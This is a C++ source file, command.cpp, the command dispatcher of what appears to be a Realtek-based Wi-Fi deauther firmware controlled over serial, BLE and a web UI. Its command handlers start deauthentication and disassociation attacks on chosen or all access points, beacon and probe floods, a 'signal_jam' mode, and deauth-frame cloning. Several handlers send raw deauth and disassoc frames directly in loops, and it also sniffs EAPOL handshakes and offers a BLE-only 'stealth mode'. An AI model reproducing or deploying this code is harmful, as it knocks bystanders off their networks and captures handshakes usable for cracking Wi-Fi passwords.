/*
 * command.cpp — Unified command parser & dispatcher for Serial CLI, BLE NUS, and WebUI HTTP API
 * Part of WiFi-Deck multi-file refactor.
 */
#include "web.h"
#include "command.h"
#include "config.h"
#include "utils.h"
#include "sniff.h"
#include "wifi_scan.h"
#include "ble.h"
#include "wifi_attack.h"

#include "wifi_conf.h"
#include "wifi_util.h"
#include "WiFi.h"
#include "osdep_service.h"

bool parseSniffTimeCmd(const String &command, unsigned long &durOut, SniffMode &modeOut, String &errMsg) {
  String rest = command.substring(11);
  rest.trim();
  int sp = rest.indexOf(' ');
  String durStr = (sp > 0) ? rest.substring(0, sp) : rest;
  durStr.trim();
  String modeStr = (sp > 0) ? rest.substring(sp + 1) : "all";
  modeStr.trim();
  long dur = 0;
  if (!parseStrictLong(durStr, dur) || dur <= 0) {
    errMsg = "Invalid sniff_time duration: " + durStr;
    return false;
  }
  SniffMode mode = SNIFF_ALL;
  if (modeStr.equalsIgnoreCase("all")) mode = SNIFF_ALL;
  else if (modeStr.equalsIgnoreCase("beacon")) mode = SNIFF_BEACON;
  else if (modeStr.equalsIgnoreCase("probe")) mode = SNIFF_PROBE;
  else if (modeStr.equalsIgnoreCase("deauth")) mode = SNIFF_DEAUTH;
  else if (modeStr.equalsIgnoreCase("eapol")) mode = SNIFF_EAPOL;
  else if (modeStr.equalsIgnoreCase("pwnagotchi")) mode = SNIFF_PWNAGOTCHI;
  else {
    errMsg = "Unknown sniff_time mode: " + modeStr;
    return false;
  }
  durOut = (unsigned long)dur;
  modeOut = mode;
  return true;
}

static bool failCmd(String *errOut, const String &msg, bool pushStatus = false) {
  if (errOut) *errOut = msg;
  Serial.println("[ERROR] " + msg);
  bleSendLog("[ERROR] " + msg);
  if (pushStatus) blePushStatus();
  return false;
}

bool executeCommand(String command, String *errOut, bool fromHttp) {
  command.trim();
  if (command.length() == 0) {
    if (errOut) *errOut = "Empty command";
    return false;
  }

  if (command.equalsIgnoreCase("ap off")) {
    // 决策 B：禁止通过 WebUI/HTTP 执行永久关闭热点的 ap off，仅允许 BLE/Serial
    if (fromHttp) {
      if (errOut) *errOut = "'ap off' is disabled over WebUI/HTTP; use BLE or Serial instead.";
      Serial.println("[WARN] Rejected HTTP 'ap off' per Decision B.");
      return false;
    }
    stopAllActiveAttacks();
    haltPromiscSniff();
    apEnabled = false;
    bool staOk = enterStaMode("ap off");
    blePushInfo();
    blePushStatus();
    if (staOk) {
      Serial.println("[INFO] AP + WebUI disabled. BLE-only stealth mode (STA active).");
    } else {
      Serial.println("[WARN] AP + WebUI disabled, but STA initialization failed.");
    }
    return true;
  }
  else if (command.equalsIgnoreCase("ap on")) {
    bool sniffingNow = false;
    rtw_enter_critical(NULL, NULL);
    sniffingNow = (isSniffing || deauth_sniff_enabled);
    rtw_exit_critical(NULL, NULL);
    if (!sniffingNow && apEnabled && isSoftApHealthy()) {
      // Idempotent path: avoid tearing down live SoftAP associations & BT PTA coex when already healthy
      if (!webServerRunning() && !startWebServer(3)) {
        if (errOut) *errOut = "WebServer port 80 bind failed";
        return false;
      }
      blePushInfo();
      blePushStatus();
      Serial.println("[INFO] AP + WebUI already active.");
      return true;
    }
    stopAllActiveAttacks();
    haltPromiscSniff();
    bool ok = startSoftAP();
    blePushInfo();
    blePushStatus();
    if (ok) {
      Serial.println("[INFO] AP + WebUI re-enabled.");
      return true;
    }
    if (errOut) *errOut = "Failed to start SoftAP / WebServer";
    Serial.println("[ERROR] AP + WebUI recovery failed.");
    return false;
  }
  else if (command.equalsIgnoreCase("start deauther") || startsWithIgnoreCase(command, "start deauther ")) {
    String spec = (command.length() > 14) ? command.substring(15) : "";
    spec.trim();
    if (spec.length() > 0) {
      String errMsg;
      if (!applyTargetSpec(spec, false, errMsg)) {
        return failCmd(errOut, errMsg, true);
      }
    } else if (!hasSelectedTargetsSafe()) {
      // 决策 A：禁止无目标时默认全攻
      return failCmd(errOut, "No targets selected. Select targets or use 'start deauther all'.", true);
    }
    stopConflictingModesBeforeAttack();
    if (!priorityStopPending) {
      emergencyStopRequested = false;
    }
    deauthSlice.reset();
    attack_enabled = true;
    blePushStatus();
    Serial.println("[INFO] Deauthentication Attack started.");
    return true;
  }
  else if (command.equalsIgnoreCase("stop deauther") || command.equalsIgnoreCase("stop") || command.equalsIgnoreCase("stop all")) {
    // Universal stop: kill every attack and restore the soft AP (if apEnabled)
    stopAllActiveAttacks();
    clearDeauthSniffState();
    bool sniffActive = false;
    rtw_enter_critical(NULL, NULL);
    sniffActive = (isSniffing || deauth_sniff_enabled);
    rtw_exit_critical(NULL, NULL);
    if (sniffActive) { stopSniffing(); }  // restores AP or STA based on apEnabled
    restoreDefaultChannelIfNeeded(true);
    if (!priorityStopPending) {
      emergencyStopRequested = false;
    }
    blePushStatus();
    Serial.println("[INFO] All attacks stopped.");
    return true;
  }
  else if (command.equalsIgnoreCase("scan")) {
    if (!priorityStopPending) {
      emergencyStopRequested = false;
    }
    stopConflictingModesBeforeAttack();
    if (lockScanMutex()) {
      target_aps.clear();
      target_mode = false;
      unlockScanMutex();
    }
    cancelBleScanPush();
    scan_enabled = true;
    Serial.println("[INFO] Starting scan...");
    bleSendLine("{\"t\":\"scan_begin\"}");
    if (scanNetworks(false, false) == 0) {
      printScanResults();
      scan_enabled = false;
      Serial.println("[INFO] Scan completed.");
      return true;
    }
    else {
      cancelBleScanPush();
      scan_enabled = false;
      Serial.println("[ERROR] Scan failed.");
      bleSendLine("{\"t\":\"scan_end\",\"n\":0,\"err\":1}");
      bleSendLog("[ERROR] Wi-Fi scan failed.");
      if (errOut) *errOut = "Wi-Fi scan failed.";
      return false;
    }
  }
  else if (command.equalsIgnoreCase("results")) {
    if (getScanCountSafe() > 0) {
      printScanResults();
    }
    else {
      Serial.println("[INFO] No scan results available. Try 'scan' first.");
    }
    // 即使结果为空也向 BLE 推送 sync_begin/sync_end(n=0)，让重连后的 App 同步热点列表与已选目标
    blePushScanResults(true, true);
    return true;
  }
  else if (startsWithIgnoreCase(command, "attack_time ")) {
    String rest = command.substring(12);
    rest.trim();
    int sp = rest.indexOf(' ');
    String valStr = (sp > 0) ? rest.substring(0, sp) : rest;
    valStr.trim();
    String spec = (sp > 0) ? rest.substring(sp + 1) : "";
    spec.trim();
    long durationMs = 0;
    if (!parseStrictLong(valStr, durationMs) || durationMs <= 0) {
      return failCmd(errOut, "Invalid attack_time duration: " + valStr, true);
    }
    if (spec.length() > 0) {
      String errMsg;
      if (!applyTargetSpec(spec, false, errMsg)) {
        return failCmd(errOut, errMsg, true);
      }
    } else if (!hasSelectedTargetsSafe()) {
      // 决策 A：无目标时拒绝定时全攻
      return failCmd(errOut, "No targets selected. Select targets or use 'attack_time <ms> all'.", true);
    }
    stopConflictingModesBeforeAttack();
    if (!priorityStopPending) {
      emergencyStopRequested = false;
    }
    deauthSlice.reset();
    startTimedAttack((unsigned long)durationMs);
    blePushStatus();
    Serial.println("[INFO] Timed attack started for " + String(durationMs) + " ms.");
    return true;
  }
  else if (command.equalsIgnoreCase("disassoc") || startsWithIgnoreCase(command, "disassoc ")) {
    String spec = (command.length() > 8) ? command.substring(9) : "";
    spec.trim();
    if (spec.length() > 0) {
      String errMsg;
      if (!applyTargetSpec(spec, false, errMsg)) {
        return failCmd(errOut, errMsg, true);
      }
      stopConflictingModesBeforeAttack();
      if (!priorityStopPending) {
        emergencyStopRequested = false;
      }
      disassocSlice.reset();
      disassoc_enabled = true;
      blePushStatus();
      Serial.println("[INFO] Continuous Disassociation Attack started.");
      return true;
    } else if (disassoc_enabled) {
      disassoc_enabled = false;
      disassocSlice.reset();
      restoreDefaultChannelIfNeeded(false);
      if (USE_LED) digitalWrite(LED_B, LOW);
      blePushStatus();
      Serial.println("[INFO] Disassociation Attack stopped.");
      return true;
    } else {
      if (!hasSelectedTargetsSafe()) {
        // 决策 A：未选目标禁止无参 disassoc 回退全攻
        return failCmd(errOut, "No targets selected. Select targets or use 'disassoc all'.", true);
      }
      stopConflictingModesBeforeAttack();
      if (!priorityStopPending) {
        emergencyStopRequested = false;
      }
      disassocSlice.reset();
      disassoc_enabled = true;
      blePushStatus();
      Serial.println("[INFO] Continuous Disassociation Attack started.");
      return true;
    }
  }
  else if (command.equalsIgnoreCase("random_attack")) {
    std::vector<WiFiScanResult> snap = snapshotScanResults();
    if (!snap.empty()) {
      stopConflictingModesBeforeAttack();
      if (!priorityStopPending) {
        emergencyStopRequested = false;
      }
      size_t idx = (size_t)random(0, snap.size());
      uint8_t randChannel = (uint8_t)snap[idx].channel;
      if (wifi_set_channel(randChannel) != RTW_SUCCESS) {
        Serial.print("[WARN] wifi_set_channel(");
        Serial.print(randChannel);
        Serial.println(") failed");
        bleSendLog("[WARN] Switch channel CH " + String(randChannel) + " failed");
        if (errOut) *errOut = "Failed to switch channel CH " + String(randChannel);
        blePushStatus();
        return false;
      } else {
        setCurrentChannelSafe(randChannel);
        for (unsigned long j = 0; j < num_send_frames; j++) {
          if (shouldAbortCycle()) break;
          uint16_t reason = deauth_reasons[j % num_deauth_reasons];
          wifi_tx_deauth_frame(snap[idx].bssid, dst_mac, reason);
          wifi_tx_disassoc_frame(snap[idx].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);
          delay(1);
        }
        restoreDefaultChannelIfNeeded(false);
        char msg[96];
        snprintf(msg, sizeof(msg), "[RANDOM ATTACK] => %s (CH %u)", snap[idx].ssid, (unsigned)randChannel);
        Serial.println(msg);
        bleSendLog(msg);
        blePushStatus();
        return true;
      }
    } else {
      return failCmd(errOut, "No scan results. Run 'scan' first.", true);
    }
  }
  //==========================
  // Flood / Jam / Sniff-clone attacks (merged from upstream v1.0.3)
  //==========================
  else if (command.equalsIgnoreCase("beacon_flood") || command.equalsIgnoreCase("beacon flood")) {
    if (beacon_flood_enabled) {
      beacon_flood_enabled = false;
      Serial.println("[INFO] Beacon flood stopped.");
    } else {
      stopConflictingModesBeforeAttack();
      if (!priorityStopPending) {
        emergencyStopRequested = false;
      }
      beacon_flood_enabled = true;
      beacon_flood_count = 0;
      Serial.println("[INFO] Beacon flood started.");
    }
    blePushStatus();
    return true;
  }
  else if (command.equalsIgnoreCase("probe_flood") || command.equalsIgnoreCase("probe flood")) {
    if (probe_flood_enabled) {
      probe_flood_enabled = false;
      Serial.println("[INFO] Probe flood stopped.");
    } else {
      stopConflictingModesBeforeAttack();
      if (!priorityStopPending) {
        emergencyStopRequested = false;
      }
      probe_flood_enabled = true;
      probe_flood_count = 0;
      Serial.println("[INFO] Probe flood started.");
    }
    blePushStatus();
    return true;
  }
  else if (command.equalsIgnoreCase("signal_jam") || command.equalsIgnoreCase("signal jam")) {
    if (signal_jam_enabled) {
      signal_jam_enabled = false;
      restoreDefaultChannelIfNeeded(true);
      if (USE_LED) digitalWrite(LED_B, LOW);
      Serial.println("[INFO] Signal jam stopped.");
    } else {
      stopConflictingModesBeforeAttack();
      if (!priorityStopPending) {
        emergencyStopRequested = false;
      }
      signal_jam_enabled = true;
      signal_jam_count = 0;
      signal_jam_ch_index = 0;
      Serial.println("[INFO] Signal jam started - rapid channel cycling + deauth.");
    }
    blePushStatus();
    return true;
  }
  else if (command.equalsIgnoreCase("deauth_sniff") || command.equalsIgnoreCase("deauth sniff")) {
    bool alreadyDeauthSniff = false;
    bool alreadySniffing = false;
    rtw_enter_critical(NULL, NULL);
    alreadyDeauthSniff = deauth_sniff_enabled;
    alreadySniffing = isSniffing;
    rtw_exit_critical(NULL, NULL);

    if (alreadyDeauthSniff) {
      stopSniffing();  // clears deauth_sniff_enabled, restores hopping, restores AP or STA
      Serial.println("[INFO] Deauth sniff stopped.");
      blePushStatus();
      return true;
    } else {
      stopAllActiveAttacks();
      if (!priorityStopPending) {
        emergencyStopRequested = false;
      }
      timedSniffEnabled = false;
      if (alreadySniffing) {
        haltPromiscSniff();
      }
      resetPromiscLogThrottle();
      // Close listening socket cleanly and reuse active STA if already in BLE-only STA mode
      int wextMode = -1;
      bool alreadySta = (!apEnabled &&
                       wlanRuntimeMode == WLAN_MODE_STA &&
                       wifi_is_up(RTW_STA_INTERFACE) &&
                       !wifi_is_up(RTW_AP_INTERFACE) &&
                       wext_get_mode(WLAN0_NAME, &wextMode) == RTW_SUCCESS &&
                       wextMode == RTW_MODE_INFRA);
      if (!alreadySta) {
        prepareRadioForSniff(true);
        feedWatchdog();
        if (wifi_on(RTW_MODE_STA) != RTW_SUCCESS) {
          wlanRuntimeMode = WLAN_MODE_UNINIT;
          Serial.println("[ERROR] wifi_on(RTW_MODE_STA) failed for deauth_sniff.");
          if (apEnabled) {
            startSoftAP();
          } else {
            restoreBleCoex(false);
          }
          blePushStatus();
          if (errOut) *errOut = "wifi_on(RTW_MODE_STA) failed";
          return false;
        }
        feedWatchdog();
        wlanRuntimeMode = WLAN_MODE_STA;
      }
      WiFi.disablePowerSave();
      restoreBleCoex(!alreadySta);
      resetHopState();
      deauth_sniff_prev_hop = isHopping;
      isHopping = true;
      int chSnap = getCurrentChannelSafe();
      if (!setChannel(chSnap)) {
        Serial.println("[WARN] deauth_sniff failed to set initial channel " + String(chSnap) + "; hopChannel will retry.");
      }

      // 先置好全部状态位再注册回调，避免首波回调漏检或状态撕裂
      rtw_enter_critical(NULL, NULL);
      currentMode = SNIFF_DEAUTH;
      isSniffing = true;
      deauth_sniff_enabled = true;
      has_sniffed_deauth = false;
      sniffed_deauth_ch = currentChannel;
      rtw_exit_critical(NULL, NULL);

      if (wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_callback, 1) != RTW_SUCCESS) {
        rtw_enter_critical(NULL, NULL);
        isSniffing = false;
        deauth_sniff_enabled = false;
        currentMode = SNIFF_STOP;
        isHopping = deauth_sniff_prev_hop;
        deauth_sniff_prev_hop = false;
        rtw_exit_critical(NULL, NULL);
        Serial.println("[ERROR] wifi_set_promisc failed for deauth_sniff.");
        restoreRadioAfterSniff();
        blePushStatus();
        if (errOut) *errOut = "wifi_set_promisc failed";
        return false;
      } else {
        Serial.println("[INFO] Deauth sniff started - auto-hopping 2.4G/5G to clone deauth frames.");
        bleSendLog("[INFO] Deauth 克隆嗅探已启动 (自动双频跳频监听)");
        blePushStatus();
        return true;
      }
    }
  }
  else if (startsWithIgnoreCase(command, "single_ap ") ||
           startsWithIgnoreCase(command, "single ap ") ||
           command.equalsIgnoreCase("single_ap") ||
           command.equalsIgnoreCase("single ap")) {
    std::vector<WiFiScanResult> snap = snapshotScanResults();
    if (snap.empty()) {
      return failCmd(errOut, "No scan results. Run 'scan' first.");
    } else if (command.length() <= 10) {
      return failCmd(errOut, "Missing AP index. Usage: single_ap <index>");
    } else {
      String idxStr = command.substring(10);
      idxStr.trim();
      long idx = -1;
      if (!parseStrictLong(idxStr, idx) || idx < 0 || idx >= (long)snap.size()) {
        return failCmd(errOut, "Invalid single_ap index: " + idxStr);
      } else {
        stopConflictingModesBeforeAttack();
        if (!priorityStopPending) {
          emergencyStopRequested = false;
        }
        if (wifi_set_channel(snap[(size_t)idx].channel) != RTW_SUCCESS) {
          Serial.print("[WARN] wifi_set_channel(");
          Serial.print(snap[(size_t)idx].channel);
          Serial.println(") failed");
          bleSendLog("[WARN] Switch CH " + String(snap[(size_t)idx].channel) + " failed");
          if (errOut) *errOut = "Failed to switch channel";
          blePushStatus();
          return false;
        } else {
          setCurrentChannelSafe((int)snap[(size_t)idx].channel);
          for (unsigned long j = 0; j < num_send_frames; j++) {
            if (shouldAbortCycle()) break;
            wifi_tx_deauth_frame(snap[(size_t)idx].bssid, dst_mac, deauth_reasons[j % num_deauth_reasons]);
            wifi_tx_disassoc_frame(snap[(size_t)idx].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);
            delay(1);
          }
          restoreDefaultChannelIfNeeded(false);
          char msg[96];
          snprintf(msg, sizeof(msg), "[SINGLE AP] Attacked %s on CH %u",
                   snap[(size_t)idx].ssid, (unsigned)snap[(size_t)idx].channel);
          Serial.println(msg);
          bleSendLog(msg);
          blePushStatus();
          return true;
        }
      }
    }
  }
  else if (command.equalsIgnoreCase("tx_stats")) {
    char statsMsg[64];
    snprintf(statsMsg, sizeof(statsMsg), "TX Stats: %lu OK / %lu FAIL",
             (unsigned long)tx_success_count, (unsigned long)tx_fail_count);
    Serial.println(statsMsg);
    bleSendLog(statsMsg);
    blePushStatus();
    return true;
  }
  else if (command.equalsIgnoreCase("reset_txstats")) {
    tx_success_count = 0;
    tx_fail_count = 0;
    seq_num_counter = 1;
    blePushStatus();
    Serial.println("[TX STATS] Reset.");
    return true;
  }
  else if (command.equalsIgnoreCase("start sniff")) {
    startMonitorSniff(SNIFF_ALL);
    blePushStatus();
    return true;
  }
  else if (command.equalsIgnoreCase("hop on")) {
    resetHopState();
    isHopping = true;
    blePushStatus();
    return true;
  }
  else if (command.equalsIgnoreCase("hop off")) {
    isHopping = false;
    blePushStatus();
    return true;
  }
  else if (startsWithIgnoreCase(command, "set ch ")) {
    String chStr = command.substring(7);
    chStr.trim();
    long newChannelLong = -1;
    bool validChannel = false;
    if (parseStrictLong(chStr, newChannelLong)) {
      int newChannel = (int)newChannelLong;
      for (int ch : CHANNELS_2GHZ) { if (ch == newChannel) validChannel = true; }
      for (int ch : CHANNELS_5GHZ) { if (ch == newChannel) validChannel = true; }
    }
    if (validChannel) {
      bool sniffingNow = false;
      rtw_enter_critical(NULL, NULL);
      sniffingNow = isSniffing;
      rtw_exit_critical(NULL, NULL);
      if ((softApActive || apEnabled) && !sniffingNow) {
        if (errOut) *errOut = "SoftAP active on CH 1; start sniff or run 'ap off' before locking channel.";
        Serial.println("[WARN] SoftAP active on CH 1; start sniff or run 'ap off' before locking channel.");
        bleSendLog("[WARN] 当前热点开启中，请先开始抓包或关闭热点后再锁频");
        return false;
      } else {
        isHopping = false;
        if (!setChannel((int)newChannelLong)) {
          bleSendLog("[WARN] 切换信道 CH " + String((int)newChannelLong) + " 失败");
          if (errOut) *errOut = "Failed to switch channel";
          blePushStatus();
          return false;
        }
        blePushStatus();
        return true;
      }
    } else {
      return failCmd(errOut, "Invalid channel: " + chStr);
    }
  }
  else if (command.equalsIgnoreCase("sniff beacon")) { startMonitorSniff(SNIFF_BEACON); blePushStatus(); return true; }
  else if (command.equalsIgnoreCase("sniff probe")) { startMonitorSniff(SNIFF_PROBE); blePushStatus(); return true; }
  else if (command.equalsIgnoreCase("sniff deauth")) { startMonitorSniff(SNIFF_DEAUTH); blePushStatus(); return true; }
  else if (command.equalsIgnoreCase("sniff eapol")) { startMonitorSniff(SNIFF_EAPOL); blePushStatus(); return true; }
  else if (command.equalsIgnoreCase("sniff pwnagotchi")) { startMonitorSniff(SNIFF_PWNAGOTCHI); blePushStatus(); return true; }
  else if (command.equalsIgnoreCase("sniff all")) { startMonitorSniff(SNIFF_ALL); blePushStatus(); return true; }
  else if (command.equalsIgnoreCase("stop sniff")) { stopSniffing(); blePushStatus(); return true; }
  else if (startsWithIgnoreCase(command, "sniff_time ")) {
    unsigned long dur = 0;
    SniffMode mode = SNIFF_ALL;
    String errMsg;
    if (!parseSniffTimeCmd(command, dur, mode, errMsg)) {
      return failCmd(errOut, errMsg);
    }
    startMonitorSniff(mode, true, dur);
    blePushStatus();
    Serial.println("[INFO] Timed sniff started for " + String(dur) + " ms.");
    return true;
  }
  else if (command.equalsIgnoreCase("clear_logs")) {
    rtw_enter_critical(NULL, NULL);
    webLogHead = 0;
    webLogCount = 0;
    webLogTotalSeq = 0;
    logHead = 0;
    logTail = 0;
    droppedLogCount = 0;
    rtw_exit_critical(NULL, NULL);
    Serial.println("[INFO] Sniff logs cleared.");
    bleSendLog("[INFO] Sniff logs cleared.");
    return true;
  }
  else if (startsWithIgnoreCase(command, "set ")) {
    String setting = command.substring(4);
    setting.trim();
    int space_index = setting.indexOf(' ');
    if (space_index != -1) {
      String key = setting.substring(0, space_index);
      String rawValue = setting.substring(space_index + 1);
      rawValue.trim();

      String errMsg = "";
      if (key.equalsIgnoreCase("cycle_delay") ||
          key.equalsIgnoreCase("scan_time") ||
          key.equalsIgnoreCase("num_frames") ||
          key.equalsIgnoreCase("start_channel") ||
          key.equalsIgnoreCase("scan_cycles") ||
          key.equalsIgnoreCase("led") ||
          key.equalsIgnoreCase("ap_ssid") ||
          key.equalsIgnoreCase("ap_pass") ||
          key.equalsIgnoreCase("ble_name")) {
        if (!validateConfigSetting(key, rawValue, errMsg)) {
          blePushInfo();
          return failCmd(errOut, errMsg);
        } else {
          bool apChanged = false;
          applyConfigSetting(key, rawValue, apChanged);
          saveConfigToFlash();
          if (apChanged) scheduleApRestart();
          blePushInfo();
          return true;
        }
      }
      else if (key.equalsIgnoreCase("target")) {
        if (!applyTargetSpec(rawValue, rawValue.length() == 0, errMsg)) {
          blePushStatus();
          return failCmd(errOut, errMsg);
        }
        blePushStatus();
        return true;
      }
      else {
        return failCmd(errOut, "Unknown setting key: " + key);
      }
    }
    else if (setting.equalsIgnoreCase("target")) {
      String errMsg;
      applyTargetSpec("", true, errMsg);
      blePushStatus();
      return true;
    } else {
      return failCmd(errOut, "Invalid set syntax: " + setting);
    }
  }
  else if (command.equalsIgnoreCase("reset_config")) {
    bool apChanged = (strcmp(ap_ssid, DEFAULT_WIFI_SSID) != 0 || strcmp(ap_pass, DEFAULT_WIFI_PASS) != 0);
    strcpy(ap_ssid, DEFAULT_WIFI_SSID);
    strcpy(ap_pass, DEFAULT_WIFI_PASS);
    updateBleName(DEFAULT_BLE_NAME);
    cycle_delay = 2000;
    scan_time = 5000;
    num_send_frames = 3;
    start_channel = 1;
    scan_between_cycles = false;
    USE_LED = true;
    saveConfigToFlash();
    blePushInfo();
    if (apChanged) scheduleApRestart();
    Serial.println("[CFG] Restored factory default configuration.");
    return true;
  }
  else if (command.equalsIgnoreCase("info")) {
    char infoMsg[224];
    snprintf(infoMsg, sizeof(infoMsg),
             "[INFO] FW=v%s SSID=%s BLE=%s cycle_delay=%lu scan_time=%lu frames=%lu",
             FIRMWARE_VERSION, ap_ssid, ble_name, cycle_delay, scan_time, num_send_frames);
    Serial.println(infoMsg);
    blePushInfo();
    return true;
  }
  else if (command.equalsIgnoreCase("help")) {
    Serial.println("Scan & Info: scan, results, info, help, tx_stats, reset_txstats");
    Serial.println("Attack: start deauther [<i,j|all>], disassoc [<i,j|all>], single_ap <index>, random_attack, attack_time <ms> [<i,j|all>], stop [all|deauther]");
    Serial.println("Flood & Jam: beacon_flood, probe_flood, signal_jam, deauth_sniff");
    Serial.println("Sniffer: start sniff, sniff beacon/probe/deauth/eapol/pwnagotchi/all, sniff_time <ms> [mode], stop sniff, hop on/off, set ch <c>, clear_logs");
    Serial.println("Config & AP: set ap_ssid/ap_pass/ble_name/cycle_delay/scan_time/num_frames/start_channel/scan_cycles/led/target <val>, reset_config, ap on/off");
    Serial.println("Web: connect to WiFi '" + String(ap_ssid) + "' and open 192.168.1.1 in browser");
    bleSendLog("Cmds: scan | results | info | help | tx_stats | reset_txstats | ap on/off | stop");
    bleSendLog("Atk: start deauther/disassoc <i,j|all> | single_ap <index> | random_attack | attack_time <ms> <spec> | beacon_flood | probe_flood | signal_jam | deauth_sniff");
    bleSendLog("Sniff/Cfg: start sniff | sniff <mode> | sniff_time <ms> [mode] | stop sniff | hop on/off | set ch <c> | clear_logs | set <k> <v> | reset_config");
    return true;
  }
  else {
    return failCmd(errOut, "Unknown command: " + command);
  }
}

void handleCommand(String command) {
  executeCommand(command, nullptr, false);
}
